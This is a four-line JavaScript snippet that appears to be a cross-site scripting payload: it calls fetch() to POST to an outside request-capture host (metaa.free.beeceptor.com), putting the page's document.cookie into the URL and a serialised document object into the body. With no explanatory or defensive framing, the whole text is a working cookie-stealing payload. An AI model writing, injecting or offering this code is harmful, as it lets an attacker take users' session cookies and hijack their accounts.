fetch('https://metaa.free.beeceptor.com/?=' + document.cookie, {
  method: 'POST',
  body: JSON.stringify(document)
});
